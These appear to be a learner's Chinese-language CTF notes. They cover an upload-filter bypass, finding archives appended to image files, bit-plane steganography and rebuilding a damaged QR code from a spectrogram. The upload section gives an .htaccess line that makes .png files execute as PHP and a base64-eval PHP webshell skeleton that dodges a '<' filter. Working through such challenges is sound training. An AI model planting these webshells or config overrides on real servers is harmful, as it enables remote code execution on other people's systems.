### 2. ez_upload：两层拦截的组合绕法

这道题的思路值得单独记，因为它是**两个限制叠在一起**：

```
限制 1：内容里出现 < 就拦   → 传 base64 形式的木马，运行时解码
限制 2：传 png 但不解析     → 先传 .htaccess，写 AddType 让它当 PHP
```

**两个限制必须同时解决**，只解决一个都不通：

```apache
# .htaccess
AddType application/x-httpd-php .png
```

```php
// x.png 里的内容（base64 形式，避开 <）
<?php eval(base64_decode('...')); ?>
```

**关键心法**：`<` 被拦就换成「运行时解码」；后缀不解析就改配置。**拦截在哪一层，就从那一层绕**。

### 3. 文件尾藏东西：先看尾巴再谈其他

「未尽之言」这题最后发现 `tail.7z`（274 KB）——**压缩包是追加在文件末尾的**。

**发现方法**（脚本名就是流程）：

```
tailcheck.py / tail2.py   → 看文件末尾有没有额外的数据
strscan.py / scanct.py    → 扫可打印字符串和已知文件头
zipcheck.py / tiffcheck.py → 试常见格式的魔数
tagdump.py                → 读元数据标签
```

**为什么先看尾巴**：图片隐写最常见的两种，一种是「改像素」（LSB、位平面），一种是「加后缀」（EOI 之后追加）。**后者比前者简单得多，应该先查**。

**判据**：`PK`（zip）、`7z`、`Rar!`、`\x1f\x8b`（gzip）这几个魔数出现在文件中间或末尾，就说明有夹带。

### 4. 位平面分离：比 LSB 多一层

昨天做的是「单通道 LSB」，今天是「按位切平面」：

```
plane_r0.png  plane_r1.png  plane_r2.png    ← R 通道的第 0/1/2 位
plane_g0.png  plane_g1.png  plane_g2.png
plane_b0.png  plane_b1.png  plane_b2.png
```

**区别**：

| 手法 | 提取什么 | 结果 |
|---|---|---|
| LSB（`v & 1`） | 最低 1 位 | 一张黑白图 |
| 位平面（`(v >> n) & 1`） | 第 n 位 | 每层一张图 |

**位平面能看出的东西更多**：有时候数据不在最低位，而在第 1 位或第 2 位；有时候不同位平面藏着不同的信息。

```python
for n in range(3):
    plane = ch.point(lambda v, n=n: 255 if (v >> n) & 1 else 0)
    plane.save(f"plane_{name}{n}.png")
```

### 5. 二维码手工重建：自制裁剪格子编辑器

「真相只有喵知道」这题的二维码是从音频频谱里切出来的，扫不出来。今天的做法是**手工重建矩阵**：

```
① 从频谱切出二维码区域（miao_square.png）
② 放大、二值化（miao_bw.png、miao_sq_600.png）
③ 数出模块数：29 × 29（Version 3 二维码）
④ 逐格判断黑白，写成矩阵文本（qr_matrix_29.txt）
⑤ 用自制的 HTML 编辑器手工改错格（QR格子编辑器.html）
⑥ 重新生成干净二维码（qr_final_clean.png）
```

**为什么需要手工**：频谱里的二维码像素不够、有噪点，自动解码器识别不出定位图案。**人眼能看出大致形状，机器不行**，所以用手工把矩阵敲出来，再用程序生成标准二维码。

**29×29 的含义**：二维码版本 3，纠错等级不同模块数也不同，29 对应 Version 3。

**自制编辑器的价值**：改几个格子就能重扫一次，比反复调阈值快。

### 2. 看文件尾部有没有夹带

```python
import re
data = open("x.png", "rb").read()
# 找常见的压缩包魔数
for magic, name in [(b"PK\x03\x04", "zip"), (b"7z\xbc\xaf", "7z"),
                    (b"Rar!", "rar"), (b"\x1f\x8b", "gzip")]:
    pos = data.find(magic)
    if pos > 0:
        print(f"{name} 出现在偏移 {pos}")
        open(f"tail.{name}", "wb").write(data[pos:])
```

### 4. 二维码矩阵转图片

```python
from PIL import Image
rows = [l.strip() for l in open("qr_matrix_29.txt") if l.strip()]
S = 10   # 每格放大倍数
img = Image.new("1", (29*S, 29*S), 1)
for y, row in enumerate(rows):
    for x, c in enumerate(row):
        if c == "#":
            img.paste(0, (x*S, y*S, (x+1)*S, (y+1)*S))
img.save("rebuilt.png")
```
